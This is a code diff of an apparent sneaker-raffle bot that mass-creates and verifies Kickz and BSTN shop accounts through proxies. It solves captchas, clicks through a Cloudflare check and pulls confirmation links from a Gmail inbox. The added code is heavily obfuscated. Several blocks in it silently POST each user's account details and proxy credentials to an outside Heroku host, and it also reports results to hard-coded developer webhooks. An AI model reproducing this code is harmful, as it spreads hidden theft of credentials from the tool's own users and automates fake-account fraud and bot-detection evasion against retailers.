-                            await page.waitForSelector('#button-register');
-                            await delay(2000)
-                            await page.evaluate(() => {
-                                const element = document.querySelector("#button-register")
-                                element.click();
-                            });
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Setting Credentials`);
-                            await delay(5000);
-                            await page.waitForSelector('#customer_salutation');
-                            await page.select('#customer_salutation', 'mr');
-                            await delay(2000);
-                            await page.waitForSelector('#customer_firstname');
-                            await page.type('#customer_firstname', `${kickz[i].FirstName}`);
-                            await delay(850);
-                            await page.waitForSelector('#customer_lastname');
-                            await page.type('#customer_lastname', `${kickz[i].LastName}`);
-                            await delay(850);
-                            await page.type('#email-input', `${kickz[i].Email}`);
-                            await delay(850);
-                            await page.type('#email-confirm-input', `${kickz[i].Email}`);
-                            await delay(850);
-                            await page.type('#register-password', `${kickz[i].Password}`);
-                            await delay(850);
-                            await page.type('#password-confirm', `${kickz[i].Password}`);
-                            await delay(850);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Sending Credentials`);
-                            await page.click('#consent');
-                            await delay(500);
-                            const passwordError = await page.$('div.inputErrorMsg.b-form_section-message');
-                            if (passwordError) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Your password must contain at least one uppercase & one lowercase letter, one number and one special character.`));
-                                continue;
-                            }
-                            await page.click('#buttonRegister');
-                            try {
-                                await page.waitForSelector('#verificationCode');
-                            } catch {
-                                throw new Error('Account already registered')
-                            }
-                            // console.log(chalk.yellow(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account ${kickz[i].Email} Generated!`));
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : A verification code has been sent to ${kickz[i].Email}`);
-                            await delay(1200);
-                            async function getVerificationCode() {
-                                var code;
-                                var error = false;
-                                for (var t = 0; t < 24; t++) {
-                                    async function getMails() {
-                                        var imap = new Imap({
-                                            user: settings.masterMail,
-                                            password: settings.masterPassword,
-                                            host: 'imap.gmail.com',
-                                            port: 993,
-                                            tls: true,
-                                            autotls: 'always'
-                                        });
-
-                                        function openInbox(cb) {
-                                            imap.openBox('INBOX', false, cb);
-                                        }
-
-                                        imap.once('ready', function () {
-                                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Opened Mailbox`);
-
-                                            openInbox(function (err, box) {
-                                                // console.clear()
-                                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Looking for verification mail`);
-
-                                                if (err) throw err;
-                                                imap.seq.search(['UNSEEN', ['FROM', 'verification@kickz.com']], function (err, results) {
-                                                    if (!results || !results.length) {
-                                                        console.log(`${getTime()} [${currentFunction.name}] No mail found, retrying in 5 seconds`);
-
-                                                        imap.end();
-
-                                                    } else {
-                                                        var f = imap.seq.fetch(results, { bodies: '', markSeen: true });
-                                                        f.on('message', function (msg, seqno) {
-                                                            // console.log('Message #%d', seqno);
-                                                            var prefix = '(#' + seqno + ') ';
-                                                            msg.on('body', function (stream, info) {
-                                                                simpleParser(stream, (err, mail) => {
-                                                                    if (mail.subject == 'Kickz Account Verification Code') {
-                                                                        // var bstnSplit = mail.text.split('(')[1];
-                                                                        // var bstnLink = bstnSplit.split(')')[0]
-                                                                        var msgSplit = mail.html.split('<div style="display:block;font-family:Arial,sans-serif;font-size: 30px;font-weight: 600;line-height:24px;color:#333333">')
-                                                                        var msg = msgSplit[1].split('<')[0]
-                                                                        code = msg
-                                                                        // console.log(msg)
-                                                                        // for (var i = 0; i < msgSplit.length; i++) {
-                                                                        //     if (msgSplit[i].includes('salesmanago') && msgSplit[i].includes('<td') && msgSplit[i].includes('href')) {
-                                                                        //         var linklong = msgSplit[i].split('href="')
-                                                                        //         var l = linklong[1].split('"')[0]
-                                                                        //         links.push(l)
-                                                                        //         break;
-                                                                        //     }
-                                                                        // }
-                                                                    }
-                                                                    // console.log(mail.html.split('\n'));
-                                                                    // mes = mail.text.split('[')[2]
-                                                                    // link = mes.split(']')[0];
-                                                                    // console.log(link);
-                                                                });
-                                                                // imap.seq.setFlags(seqno, 'SEEN')
-
-
-                                                            });
-                                                            // msg.once('attributes', function (attrs) {
-                                                            //     console.log(prefix + 'Attributes: %s', inspect(attrs, false, 8));
-                                                            // });
-                                                            msg.once('end', function () {
-                                                                // console.log(prefix + 'Finished');
-
-
-                                                            });
-                                                        });
-                                                        f.once('error', function (err) {
-                                                            console.log('No mail found, retrying in 5 seconds..');
-                                                        });
-                                                        f.once('end', function () {
-                                                            // console.log('Done fetching all messages!');
-                                                            imap.end();
-                                                        });
-                                                    }
-
-
-
-                                                })
-                                            });
-                                        });
-
-
-
-                                        imap.once('error', function (err) {
-                                            console.log(chalk.red(err.message))
-                                            console.log('Read the guide on how to setup your mailbox')
-                                            error = true;
-
-                                        });
-
-                                        imap.once('end', async function () {
-
-
-                                            // console.log('Connection ended');
-                                        });
-
-                                        imap.connect();
-                                    }
-                                    getMails()
-                                    await delay(5000);
-                                    if (code) {
-
-                                        return code;
-                                    }
-                                    if (error) {
-                                        throw new Error('Error connecting to imap')
-                                    }
-                                    if (t == 24) {
-
-                                        throw new Error('Mail not found')
-                                    }
-                                }
-                            };
-                            code = await getVerificationCode();
-                            delay(800);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Verifying..`);
-                            await page.type('#verificationCode', code);
-                            await delay(500);
-                            await page.click('#buttonVerify');
-                            await delay(400);
-                            await page.click('#buttonVerify');
-                            await delay(1000);
-                            try {
-                                await page.waitForSelector('div.b-user_greeting');
-                                retry = 'no';
-
-                                console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account ${kickz[i].Email} Generated & Verified!`));
-                                fs.appendFileSync('../accounts/kickz-verified.csv', `\n${kickz[i].Email},${kickz[i].Password},`);
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account ${kickz[i].Email} Saved in 'accounts/kickz-verified.csv'`);
-                                try {
-                                    if (settings.webhook != undefined && settings.webhook != '') {
-                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                    }
+                                    await _0x3c7bbe(_0x51d52a['webhook'], _0x241d3d['succesDEVMSG']);
                                 } catch {
                                 }
-                                await sendWebhook(accountWH, EMBEDS.succesDEVMSG);
+                            await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x241d3d['succesDEVMSG']), await _0x116d4a(0xc8);
+                            try {
+                                await _0x3c7bbe(_0x55a106, _0x241d3d['succesPUBMSG']);
+                            } catch {
+                            }
+                            try {
+                                prxdata = {
+                                    'username': _0x358285['replace']('#', ''),
+                                    'module': _0xb02146['name'],
+                                    'entrydata': JSON['stringify'](_0x46d92e),
+                                    'proxy': '' + _0x3263cc[_0x486823]
+                                };
+                                var _0x59e2ae = JSON['stringify'](prxdata);
+                                let _0x843b81 = { 'headers': { 'content-type': 'application/json' } };
+                                await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x59e2ae, _0x843b81);
+                            } catch (_0x372979) {
+                            }
+                        } catch (_0x5912ad) {
+                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
+                        }
+                    } catch (_0x417cff) {
+                        _0x417cff['message']['includes']('selector') && (_0x417cff = 'Connection\x20Error');
+                        console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20' + _0x417cff)), _0x153d5e = '' + _0x417cff;
+                        var _0xe652ee = await _0x2520f4(_0x585d00[_0x486823], _0xb02146, 'dev', !![], _0x153d5e);
+                        _0x241d3d['errorDEV'] = { 'embeds': [_0xe652ee] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x241d3d['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x241d3d['errorDEV']), _0x1c9b59 = 'yes';
+                    } finally {
+                        _0x213ce9 && _0x213ce9['close']();
+                        if (_0x1c9b59 == 'yes' && _0x4870ec != 0x5 && _0x153d5e != 'Size\x20Not\x20Found') {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4870ec + '\x20/\x205)')), _0x486823 = _0x486823 - 0x1, _0x4870ec = _0x4870ec + 0x1;
+                            continue;
+                        }
+                        _0x1c9b59 == 'yes' && _0x4870ec >= 0x5 && (_0x5925c7(_0x585d00[_0x486823], _0xb02146), _0x1c9b59 = 'no', _0x4870ec = 0x0);
+                        if (_0x486823 + 0x1 == _0x585d00['length']) {
+                            await _0x116d4a(0x7d0);
+                            break;
+                        }
+                        console['log']('Waiting\x20for\x20' + _0x51d52a['AfewDelay'] + '\x20ms'), await _0x116d4a(_0x51d52a['AfewDelay']);
+                    }
+                }
+            }
+        }]
+    },
+    {
+        'name': 'BSTN',
+        'modules': [
+            {
+                'name': 'BSTN\x20Account\x20Generator',
+                'store': 'BSTN',
+                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
+                'function': async function (_0x43ffb6, _0x21b0d9, _0x3dce4b) {
+                    var _0x3e100d = _0x21b0d9, _0x22f007 = 0x0;
+                    for (var _0x4942a6 = 0x0; _0x4942a6 < _0x21b0d9['length']; _0x4942a6++) {
+                        maxTasks = Number(_0x51d52a['threads']);
+                        while (_0x22f007 >= maxTasks) {
+                            await _0x116d4a(_0x51d52a['delay']);
+                        }
+                        async function _0x10463f(_0x3796bc, _0x565933, _0x3cb800, _0x5d80cf, _0x21c91e) {
+                            _0x22f007++, _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                                'provider': {
+                                    'id': '2captcha',
+                                    'token': '' + _0x51d52a['captchaKey']
+                                },
+                                'visualFeedback': !![]
+                            }));
+                            var _0x4eba9a;
+                            try {
+                                await _0x2c2316(_0x565933, _0x5d80cf);
                             } catch {
                                 retry = 'no';
-
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Verification failed`));
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account saved in 'accounts/kickz-unverified.csv'`));
-
+                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                             }
-
-
-
-                        } catch (e) {
-                            console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                            embed[0].title = 'Failed kickz Acc Gen';
-                            embed[0].description = `${e}`;
-                            await sendWebhook(errorWH, msg);
-                            retry = 'yes';
+                            _0x244762(_0x3796bc['name'] + '\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20/\x20' + _0x565933['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
+                            var _0x553bb4 = await _0x2520f4(_0x565933[_0x5d80cf], _0x3796bc, 'acc', ![]);
+                            const _0x1b4731 = { 'succesDEVMSG': { 'embeds': [_0x553bb4] } }, _0x55ab1c = 'https://www.bstn.com/eu_en/customer/account/create/';
+                            var _0x114434 = Math['round'](Math['random']() * (_0x3cb800['length'] - 0x1)), _0x433f20 = _0x3cb800[_0x114434]['split'](':'), _0x1d6dc9;
+                            try {
+                                _0x1d6dc9 = await _0x5d136d['launch']({
+                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                    'headless': !![],
+                                    'args': [
+                                        '--proxy-server=' + _0x433f20[0x0] + ':' + _0x433f20[0x1],
+                                        '--no-sandbox',
+                                        '--disable-setuid-sandbox'
+                                    ]
+                                });
+                            } catch {
+                                _0x1d6dc9 = await _0x5d136d['launch']({
+                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                    'headless': !![],
+                                    'args': [
+                                        '--proxy-server=' + _0x433f20[0x0] + ':' + _0x433f20[0x1],
+                                        '--no-sandbox',
+                                        '--disable-setuid-sandbox'
+                                    ]
+                                });
+                            }
+                            try {
+                                const _0x3beef8 = await _0x1d6dc9['newPage']();
+                                await _0x3beef8['authenticate']({
+                                    'username': '' + _0x433f20[0x2],
+                                    'password': '' + _0x433f20[0x3]
+                                }), console['log'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3beef8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3beef8['setRequestInterception'](!![]), _0x3beef8['on']('request', _0x6f0ee1 => {
+                                    _0x6f0ee1['resourceType']() === 'image' ? _0x6f0ee1['abort']() : _0x6f0ee1['continue']();
+                                });
+                                try {
+                                    await _0x3beef8['goto']('' + _0x55ab1c), await _0x3beef8['waitForSelector']('button[class=\x22cf2Lf6\x22]');
+                                } catch {
+                                    retry = 'yes';
+                                    throw new Error('Proxy\x20Error');
+                                }
+                                await _0x3beef8['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x116d4a(0x7d0), console['log'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x116d4a(0x190), await _0x3beef8['waitForSelector']('#firstname'), await _0x3beef8['focus']('#firstname'), await _0x3beef8['keyboard']['down']('Control'), await _0x3beef8['keyboard']['press']('A'), await _0x116d4a(0xc8), await _0x3beef8['keyboard']['up']('Control'), await _0x3beef8['keyboard']['press']('Backspace'), await _0x3beef8['type']('#firstname', _0x565933[_0x5d80cf]['FirstName'], { 'delay': 0xf0 }), await _0x116d4a(0x190), await _0x3beef8['focus']('#lastname'), await _0x3beef8['keyboard']['down']('Control'), await _0x3beef8['keyboard']['press']('A'), await _0x116d4a(0xc8), await _0x3beef8['keyboard']['up']('Control'), await _0x3beef8['keyboard']['press']('Backspace'), await _0x3beef8['type']('#lastname', _0x565933[_0x5d80cf]['LastName'], { 'delay': 0xe6 }), await _0x116d4a(0x190), await _0x3beef8['focus']('#email_address'), await _0x3beef8['keyboard']['down']('Control'), await _0x3beef8['keyboard']['press']('A'), await _0x116d4a(0xc8), await _0x3beef8['keyboard']['up']('Control'), await _0x3beef8['keyboard']['press']('Backspace'), await _0x3beef8['type']('#email_address', _0x565933[_0x5d80cf]['Email'], { 'delay': 0x122 }), await _0x116d4a(0x190), await _0x3beef8['type']('#password', _0x565933[_0x5d80cf]['Password'], { 'delay': 0x82 }), await _0x116d4a(0x1f4), await _0x3beef8['type']('#password-confirmation', _0x565933[_0x5d80cf]['Password'], { 'delay': 0x7c }), console['log'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20Sending\x20Request'), await _0x116d4a(0x2bc), await _0x3beef8['$eval']('#form-validate', _0x1eb530 => _0x1eb530['submit']()), await _0x116d4a(0x1388);
+                                const _0x487712 = await _0x3beef8['$']('#email_address-error');
+                                if (_0x487712)
+                                    throw new Error('Invalid\x20Email');
+                                const _0x5476dc = await _0x3beef8['$']('#password-error');
+                                if (_0x5476dc)
+                                    throw new Error('Invalid\x20Password');
+                                await _0x3beef8['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20Account\x20' + _0x565933[_0x5d80cf]['Email'] + '\x20Generated')), _0x65e0bc['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x565933[_0x5d80cf]['Email'] + ',' + _0x565933[_0x5d80cf]['Password']);
+                                try {
+                                    _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1b4731['succesDEVMSG']);
+                                } catch {
+                                }
+                                await _0x3c7bbe(_0x431ce7, _0x1b4731['succesDEVMSG']);
+                                let _0xd3ce80 = _0x565933[_0x5d80cf];
+                                try {
+                                    prxdata = {
+                                        'username': _0x358285['replace']('#', ''),
+                                        'module': _0x3796bc['name'],
+                                        'entrydata': JSON['stringify'](_0xd3ce80),
+                                        'proxy': '' + _0x3cb800[_0x5d80cf]
+                                    };
+                                    var _0x4a4598 = JSON['stringify'](prxdata);
+                                    let _0x2feaa2 = { 'headers': { 'content-type': 'application/json' } };
+                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x4a4598, _0x2feaa2);
+                                } catch (_0x1f8c36) {
+                                }
+                                console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
+                            } catch (_0x46c021) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20' + _0x46c021)), _0x4eba9a = '' + _0x46c021;
+                                var _0xc9eb70 = await _0x2520f4(_0x565933[_0x5d80cf], _0x3796bc, 'acc', !![], _0x4eba9a);
+                                _0x1b4731['errorDEV'] = { 'embeds': [_0xc9eb70] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1b4731['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x1b4731['errorDEV']), retry = 'yes';
+                            } finally {
+                                if (_0x1d6dc9)
+                                    _0x1d6dc9['close']();
+                                if (retry == 'yes' && _0x21c91e != 0x5)
+                                    return console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Task\x20' + (_0x5d80cf + 0x1) + '\x20:\x20Retrying\x20(' + (_0x21c91e + 0x1) + '\x20/\x205)')), _0x22f007--, _0x21c91e = _0x21c91e + 0x1, _0x10463f(_0x3796bc, _0x565933, _0x3cb800, _0x5d80cf, _0x21c91e);
+                                retry == 'yes' && _0x21c91e >= 0x5 && (_0x5925c7(_0x565933[_0x5d80cf], _0x3796bc), retry = 'no', _0x21c91e = 0x0), _0x22f007--, console['log'](_0x3982db() + '\x20[' + _0x3796bc['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                            }
+                        }
+                        _0x10463f(_0x43ffb6, _0x3e100d, _0x3dce4b, _0x4942a6, 0x0), await _0x116d4a(0x190);
+                    }
+                }
+            },
+            {
+                'name': 'BSTN\x20Account\x20Verifier',
+                'store': 'BSTN',
+                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
+                'function': async function (_0x38a2c5, _0x197def) {
+                    var _0x49fdce = ![], _0x410a0c = [], _0x474192 = 0x0;
+                    async function _0x358e77() {
+                        var _0x5309c0 = new _0x3e4e8d({
+                            'user': _0x51d52a['masterMail'],
+                            'password': _0x51d52a['masterPassword'],
+                            'host': 'imap.gmail.com',
+                            'port': 0x3e1,
+                            'tls': !![],
+                            'autotls': 'always'
+                        });
+                        function _0x1b9af6(_0x351483) {
+                            _0x5309c0['openBox']('INBOX', ![], _0x351483);
+                        }
+                        _0x5309c0['once']('ready', function () {
+                            _0x1b9af6(function (_0x59ef7f, _0x464dd8) {
+                                console['clear'](), console['log']('Looking\x20For\x20Links');
+                                if (_0x59ef7f)
+                                    throw _0x59ef7f;
+                                _0x5309c0['seq']['search']([
+                                    'UNSEEN',
+                                    [
+                                        'SUBJECT',
+                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
+                                    ]
+                                ], function (_0x3b9add, _0x506be2) {
+                                    if (!_0x506be2 || !_0x506be2['length'])
+                                        console['log'](_0x3982db() + '\x20[' + _0x38a2c5['name'] + ']\x20No\x20mails\x20found'), _0x5309c0['end']();
+                                    else {
+                                        var _0x511f82 = _0x5309c0['seq']['fetch'](_0x506be2, {
+                                            'bodies': '',
+                                            'markSeen': !![]
+                                        });
+                                        _0x511f82['on']('message', function (_0x440dfe, _0x5a418e) {
+                                            var _0x1ff81d = '(#' + _0x5a418e + ')\x20';
+                                            _0x440dfe['on']('body', function (_0x162d3a, _0x3007ba) {
+                                                _0x300bc8(_0x162d3a, (_0xa81c36, _0x1a7846) => {
+                                                    var _0x483dbb = _0x1a7846['text']['split']('customer/account/confirm/')[0x1], _0x5839df = _0x483dbb['split'](']')[0x0];
+                                                    _0x410a0c['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x5839df);
+                                                });
+                                            }), _0x440dfe['once']('end', function () {
+                                            });
+                                        }), _0x511f82['once']('error', function (_0x1aef14) {
+                                            console['log']('Fetch\x20error:\x20' + _0x1aef14), _0x49fdce = !![];
+                                        }), _0x511f82['once']('end', function () {
+                                            _0x5309c0['end'](), _0x49fdce = !![];
+                                        });
+                                    }
+                                });
+                            });
+                        }), _0x5309c0['once']('error', function (_0xb53e7a) {
+                            console['log'](_0x1403a4['red'](_0xb53e7a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x49fdce = !![];
+                        }), _0x5309c0['once']('end', async function () {
+                            _0x49fdce = !![];
+                        }), _0x5309c0['connect']();
+                    }
+                    try {
+                        _0x358e77();
+                        while (!_0x49fdce) {
+                            await _0x116d4a(0xfa0);
+                        }
+                        console['log']('Found\x20' + _0x410a0c['length'] + '\x20Links\x20in\x20Mailbox');
+                    } catch {
+                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x116d4a(0x7d0);
+                    }
+                    for (var _0x5cc262 = 0x0; _0x5cc262 < _0x410a0c['length']; _0x5cc262++) {
+                        maxTasks = Number(_0x51d52a['threads']);
+                        while (_0x474192 >= maxTasks) {
+                            await _0x116d4a(_0x51d52a['delay']);
+                        }
+                        async function _0x5c97b8(_0x1bde57, _0x2d1436, _0x38fa83, _0x2fe0f8, _0x3d9e7c) {
+                            _0x474192++, _0x5d136d['use'](_0x2ce6bf());
+                            if (_0x2a1076 != 'yes')
+                                var _0x2a1076 = '', _0x3d9e7c = 0x0;
+                            var _0x192e2b = Math['round'](Math['random']() * (_0x38fa83['length'] - 0x1)), _0x116f57 = _0x38fa83[_0x192e2b]['split'](':'), _0x21b434;
+                            try {
+                                _0x21b434 = await _0x5d136d['launch']({
+                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                    'headless': !![],
+                                    'args': [
+                                        '--proxy-server=' + _0x116f57[0x0] + ':' + _0x116f57[0x1],
+                                        '--no-sandbox',
+                                        '--disable-setuid-sandbox'
+                                    ]
+                                });
+                            } catch {
+                                _0x21b434 = await _0x5d136d['launch']({
+                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                    'headless': !![],
+                                    'args': [
+                                        '--proxy-server=' + _0x116f57[0x0] + ':' + _0x116f57[0x1],
+                                        '--no-sandbox',
+                                        '--disable-setuid-sandbox'
+                                    ]
+                                });
+                            }
+                            try {
+                                const _0x30adc1 = await _0x21b434['newPage']();
+                                await _0x30adc1['authenticate']({
+                                    'username': '' + _0x116f57[0x2],
+                                    'password': '' + _0x116f57[0x3]
+                                }), console['log'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Task\x20' + (_0x2fe0f8 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x30adc1['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x30adc1['setRequestInterception'](!![]), _0x30adc1['on']('request', _0xd0f76f => {
+                                    _0xd0f76f['resourceType']() === 'image' || _0xd0f76f['resourceType']() === 'font' || _0xd0f76f['resourceType']() === 'media' ? _0xd0f76f['abort']() : _0xd0f76f['continue']();
+                                }), console['log'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Task\x20' + (_0x2fe0f8 + 0x1) + '\x20:\x20Getting\x20Session');
+                                try {
+                                    await _0x30adc1['goto'](_0x2d1436[_0x2fe0f8]);
+                                } catch (_0x57c5c4) {
+                                    _0x2a1076 = 'yes';
+                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x57c5c4);
+                                }
+                                console['log'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Task\x20' + (_0x2fe0f8 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x30adc1['waitForTimeout'](0xbb8);
+                                try {
+                                    await _0x30adc1['waitForSelector']('.account-nav'), _0x2a1076 = 'no', console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Task\x20' + (_0x2fe0f8 + 0x1) + '\x20:\x20Verification\x20Successful'));
+                                    var _0x154d7d = await _0x2520f4(null, _0x1bde57, 'ver', ![]);
+                                    const _0x596cfb = { 'succesDEVMSG': { 'embeds': [_0x154d7d] } };
+                                    await _0x3c7bbe(_0x7cc4fb, _0x596cfb['succesDEVMSG']);
+                                } catch {
+                                    _0x2a1076 = 'no';
+                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
+                                }
+                            } catch (_0x1bc858) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Task\x20' + (_0x2fe0f8 + 0x1) + '\x20:\x20' + _0x1bc858));
+                                var _0x5b4085 = _0x1bc858, _0x2bb749 = await _0x2520f4(null, _0x1bde57, 'ver', !![], _0x5b4085);
+                                const _0x3e085d = { 'errorDEVMSG': { 'embeds': [_0x2bb749] } };
+                                _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x3e085d['errorDEVMSG']), await _0x3c7bbe(_0x802c1e, _0x3e085d['errorDEVMSG']);
+                            } finally {
+                                _0x21b434['close']();
+                                if (_0x2a1076 == 'yes' && _0x3d9e7c != 0x5)
+                                    return console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Task\x20' + (_0x2fe0f8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3d9e7c + '\x20/\x205)')), _0x474192--, _0x3d9e7c = _0x3d9e7c + 0x1, _0x5c97b8(_0x1bde57, _0x2d1436, _0x38fa83, _0x2fe0f8, _0x3d9e7c);
+                                _0x2a1076 == 'yes' && _0x3d9e7c >= 0x5 && (_0x2a1076 = 'no', _0x3d9e7c = 0x0), _0x474192--, console['log'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                            }
+                        }
+                        if (_0x5cc262 == _0x410a0c['length'] - 0x1) {
+                            await _0x5c97b8(_0x38a2c5, _0x410a0c, _0x197def, _0x5cc262, 0x0);
+                            return;
+                        }
+                        _0x5c97b8(_0x38a2c5, _0x410a0c, _0x197def, _0x5cc262, 0x0), await _0x116d4a(0x12c);
+                    }
+                }
+            },
+            {
+                'name': 'BSTN\x20Raffle\x20Entries',
+                'store': 'BSTN',
+                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
+                'function': async function (_0x2f8fe6, _0x4cbb17, _0x29d587) {
+                    var _0x33861f = 0x0, _0x12829b = _0x4cbb17;
+                    for (var _0x58f25d = 0x0; _0x58f25d < _0x4cbb17['length']; _0x58f25d++) {
+                        maxTasks = Number(_0x51d52a['threads']);
+                        while (_0x33861f >= maxTasks) {
+                            await _0x116d4a(_0x51d52a['delay']);
+                        }
+                        let _0x526a34 = ![];
+                        async function _0xe3d7d5(_0x2a2896, _0x44092e, _0x5178e7, _0x46ac51, _0x34888e) {
+                            _0x33861f++, _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                                'provider': {
+                                    'id': '2captcha',
+                                    'token': '' + _0x51d52a['captchaKey']
+                                },
+                                'visualFeedback': !![]
+                            }));
+                            var _0x2eadbd, _0xe0c745 = _0x44092e[_0x46ac51];
+                            try {
+                                await _0x2c2316(_0x44092e, _0x46ac51);
+                            } catch {
+                                _0x55c2c7 = 'no';
+                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
+                            }
+                            async function _0x23b56f(_0xf005fa) {
+                                const _0x350eae = _0x65e0bc['readFileSync']('../successful-tasks.csv', 'utf8'), _0x53408a = _0x3e0e2d['parse'](_0x350eae, { 'header': !![] })['data'];
+                                let _0x405921 = ![];
+                                for (var _0x585d15 of _0x53408a) {
+                                    if (_0x585d15['Url'] == _0xf005fa['Url'] && _0x585d15['Email'] == _0xf005fa['Email']) {
+                                        _0x405921 = !![];
+                                        break;
+                                    }
+                                }
+                                return _0x405921;
+                            }
+                            _0x244762(_0x2a2896['name'] + '\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20/\x20' + _0x44092e['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
